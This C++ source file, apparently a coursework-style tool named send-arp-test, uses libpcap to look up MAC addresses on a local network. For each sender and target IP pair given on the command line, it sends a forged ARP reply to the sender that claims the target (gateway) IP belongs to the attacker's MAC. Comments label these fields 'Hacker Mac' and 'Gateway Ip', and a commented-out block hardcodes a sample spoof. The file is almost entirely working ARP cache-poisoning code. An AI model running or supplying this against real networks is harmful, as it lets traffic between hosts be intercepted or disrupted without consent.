#include <string>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;
#define MAC_SIZE 6
#define TMAC_SIZE 20
#pragma pack(push, 1)
pcap_t* handle;

char my_ip[40];
char my_tmac[TMAC_SIZE];
unsigned char my_mac[MAC_SIZE];
unsigned char test_mac[14];
char  *dev;
char temp_mac[TMAC_SIZE];
char sender_mac[TMAC_SIZE];
char target_mac[TMAC_SIZE];

u_int32_t packetsize=0;
u_int8_t eth_header_len = 14;
u_int8_t ip_header_len;//4bit
u_int8_t tcp_header_len;//4bit

bool find_arp_packet(const u_char* packet,char *mac,char* ip);
void transform_mac(unsigned char* mac,char* tmac);
void cmp_ip(char* ip, uint32_t tempip);
void find_my_ip();
void find_my_mac();
void send_forg_arp(char *sip,char *dip);	
void find_mac(char *ip,char *mac);

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {

	printf("argc = %d\n", argc);	
	int size=0;	
	if ( argc < 4 | argc % 2 == 1) {//input error
		usage();
		return -1;
	}
	size = argc / 2 - 1; // number of arp packet
//	printf("size = %d\n",size);

	dev = argv[1];//interface assign
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev,BUFSIZ , 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	///////////////////////////////////////////////// 
	find_my_mac();//my_mac = mac;
	find_my_ip();//my_ip = interface ip;
	//printf("\n my interface mac = %s",my_mac);	
	//printf("\n my interface ip= %s\n", my_ip);
/*	
	for(int i=0; i<6;i++)//print mac
	{
		printf("%.2x.",my_mac[i]);
	}
*/
	transform_mac(my_mac,my_tmac);
	printf("\n my interface mac = %s",my_tmac);	
	printf("\n my interface ip= %s\n", my_ip);
//	return 0;
	//char sender_mac[11];
	//char target_mac[11];
//	memset(sender_mac,0,11);
//	memset(target_mac,0,11);

	for(int i=0; i< size;i++)
	{
		memset(sender_mac,0,11);
		memset(target_mac,0,11);
	//	memset(temp_mac,0,11);
		find_mac(argv[i*2+2],sender_mac);// find sender mac
		printf("\nsender_ip = %s",argv[i*2+2]);
		printf("\nsender_mac = %s",sender_mac);
		printf("\n");	
	//	memcpy(temp_mac,sender_mac,11);
		find_mac(argv[i*2+3],target_mac);// find target mac
		printf("\ntarget_ip = %s",argv[i*2+3]);
		printf("\ntarget_mac = %s",target_mac);
		

	//	printf("\nckeck2-1 = %s\n",temp_mac);
		printf("\nckeck2 = %s\n",sender_mac);
		printf("\nckeck2 = %s\n",target_mac);
		send_forg_arp(argv[i*2+2],argv[i*2+3]);	
		printf("\n\n\n");
	}
	/*
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.eth_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.arp_.sip_ = htonl(Ip("172.30.1.254"));//Gateway Ip
	packet.arp_.tmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.arp_.tip_ = htonl(Ip("172.30.1.57"));//Sender Ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	*/
	pcap_close(handle);
}

void cmp_ip(char* ip,uint32_t tempip){
	char iparr[48];
	u_char buf[4];
	//memcpy(buf,&packet[30],4);
/*
	printf("\n\n pre arr = ");
	for(int i=0;i<4;i++)
	{
		printf("%d.",buf[i]);	
	}
	printf("\n");
*/
//	sprintf(iparr,"%d.%d.%d.%d",(tempip>>24)&0xFF, (tempip>>16)&0xFF, (tempip>>8)&0xFF, tempip&0xFF);
//	printf("\n\n iparr = %s\n",iparr);
}
void transform_mac(unsigned char* mac, char* tmac){
	int size=0;
	for(int i=0; i < 6;i++)
	{
		if(i==5){
			sprintf(&tmac[size],"%.2x",mac[i]);
			break;
		}	
		size +=sprintf(&tmac[size],"%.2x:",mac[i]);
		//printf(" \nstr =%s and size = %d ",str, size);
	}
	//printf(" \nmac =%s ", tmac);
}

void find_mac(char* ip,char* mac){
	EthArpPacket packet;
	//printf("\n ip = %s",ip); // check input
	
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//broad cast Mac
//	packet.eth_.dmac_ = Mac(my_tmac);//broad cast Mac
	packet.eth_.smac_ = Mac(my_tmac);//my Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_tmac);//my Mac
	packet.arp_.sip_ = htonl(Ip(my_ip));//my Ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");//your Mac
	packet.arp_.tip_ = htonl(Ip(ip));//your Ip
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
	while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        //printf("%u bytes captured\n", header->caplen);
        packetsize = header->caplen;
/*
		printf("\n\n packet\n");
		for(int i=0; i < header->caplen; i++)
		{
			printf("%.2x ",packet[i]);
			if(i>0 && i%16 ==0)
			{
				printf("\n");
				continue;
			}
			if(i>0 && i%8 ==0)
				printf(" ");
		}
		printf("\n\n mem packet\n");
		unsigned char * test = (unsigned char*)malloc(header->caplen);
		memcpy(test,packet,header->caplen);
		for(int i=0; i < header->caplen; i++)
		{
			printf("%.2x ",test[i]);
			if(i>0 && i%16 ==0)
			{
				printf("\n");
				continue;
			}
			if(i>0 && i%8 ==0)
				printf(" ");
		}
		unsigned char* tempip = (unsigned char*)malloc(4);
		memcpy(tempip,&packet[30],4);
		printf("\n\ntemp mem ip \n");
		for(int i=0; i< 4;i++)
		{
			printf("%.2x. ",tempip[i]);
		}
		printf("\n");
		for(int i=0; i< 4;i++)
		{
			printf("%d. ",tempip[i]);
		}
		printf("\n");
*/
	/*	
		printf("\n pre ip = ");
		for(int i=0;i<4;i++)
		{
			printf("%d.",packet[28+i]);	
		}
	*/
//		exit(1);	
		/////////////////////////
	/*
        if(pcap_print(packet))
        {
            packetsize = 0;
            continue;
        }
        packetsize=0;
	*/
		if(find_arp_packet(packet, mac, ip))//if find arp break;
		{
			break;
		}
    }

}
void send_forg_arp(char *sip,char *dip){

	EthArpPacket packet;
	
	printf("\nckeck1 = %s\n",sender_mac);
	packet.eth_.dmac_ = Mac(sender_mac);//Sender Mac
	packet.eth_.smac_ = Mac(my_tmac);//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	//packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_tmac);//Hacker Mac
	packet.arp_.sip_ = htonl(Ip(dip));//Gateway Ip
	packet.arp_.tmac_ = Mac(sender_mac);//Sender Mac
	packet.arp_.tip_ = htonl(Ip(sip));//Sender Ip
	
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	printf("\n send mod arp packet\n");
	//pcap_close(handle);
}

bool find_arp_packet(const u_char* packet,char * mac,char *ip){
	uint8_t arp_sig[2];
	uint8_t arp_op[2];
	
	memcpy(arp_op,&packet[20],2);
	memcpy(arp_sig,&packet[12],2);
	//uint32_t* ip_p = reinterpret_cast<uint32_t*>(arp_sip);
	uint16_t* p = reinterpret_cast<uint16_t*>(arp_sig);
	uint16_t* op_p = reinterpret_cast<uint16_t*>(arp_op);
	
	uint16_t n = *p;
	uint16_t op_n = *op_p;
	
	//printf("\n print - ip = ");
/*
	for(int i=0;i<4;i++)
	{
		printf("%d.",packet[30+i]);	
	}
*/
	//transform_ip(ip,(uint32_t)&packet[28])
//	transform_ip(ip,ip_n);

	n = ntohs(n);
	op_n = ntohs(op_n);
	if( n == 0x0806 && op_n == 0x0002)//find arp and reply packet control
	{	/*
		u_char ip_n[4];
		memcpy(ip_n,&packet[30],4);
		ip_n = ntohl(ip_n);// liitle end
		cmp_ip(ip,ip_n);
		*/
		uint8_t arr[4];
		char temp[48];
		memcpy(arr,&packet[28],4);
		sprintf(temp,"%d.%d.%d.%d",arr[0],arr[1],arr[2],arr[3]);
		//printf("\n\nsprintf test = %s\n\n",temp);
		int result = strcmp(temp,ip);
		//printf(" \n\n cmp result =%d\n\n",result);
		if(!strcmp(temp,ip))// same - copy mac
		{
			sprintf(mac,"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",packet[22],packet[23],packet[24],packet[25],packet[26],packet[27]);
		//	printf("\n\ncopt mac = %s\n\n",mac);
			return true;
		}
		//printf("\n\n print test2 = %d %d %d %d\n\n",arr[0],arr[1],arr[2],arr[3]);
		//printf("\n\n print test = %d %d %d %d\n\n",packet[28],packet[29],packet[30],packet[31]);
		//printf("\n trans_ip = %s\n",ip);
		//printf("\n arp reply = %.4x \n",op_n);
		//printf("\n arp reply ip = %x \n",ip_n);

	}
	/*
	for(int i=0; i<4; i++)
	{
		printf("%.3d ",ip_p[i]);

	}
	*/
	//printf("\n mod_arp_sig = 0x%.4x ",n);

	//printf("\n pakcet_arp_sig = %.2x%.2x\n",packet[12],packet[13]);
/*
	for(int i=0;i<packetsize;i++)
	{
		if(i%16 == 0)
		{
			printf("%.2x ",packet[i]);
			printf("\n");
		}
		else if(i%8 == 0)
		{
			printf("%.2x ",packet[i]);
			printf(" ");
		}
		else
		{
			printf("%.2x ",packet[i]);
		}
	}
	printf("\n");
*/
	return false;
}
void ck_ip_header_len(u_char *buf){
}
void ck_tcp_header_len(u_char *buf){
}
bool ck_tcp(u_char *buf){
	return true;
}

bool pcap_print(u_char *buf)
{
	return true;
}
void find_my_ip()
{
	struct ifreq ifr;
//	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
		//printf("myOwn IP Address is %s\n", my_ip);
	}

}
void find_my_mac()
{
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	//printf("start \n ");
	setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, dev,sizeof(dev) );
	//printf("end \n ");
    
	ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	char *tempdev;	

    for (; it != end; ++it) {
		//printf("namme = %s\n",it->ifr_name);
        strcpy(ifr.ifr_name, it->ifr_name);
		//strcpy(tempdev,it->ifr_name);
//		printf("namme = %s %s\n",dev,it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback

  				if(strcmp(it->ifr_name,dev)){
					continue;//same interface mac 
				}
	
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }

    if (success) 
	{
		memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
//		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
	}
//    if (success) memcpy(test_mac, ifr.ifr_hwaddr.sa_data, 14);
	
	//printf("\n test_ip =%s\n",my_ip);
	/*
	for(int i=0; i< 14;i++)
	{
		printf("%.2x",test_mac[i]);
	}
	*/
}
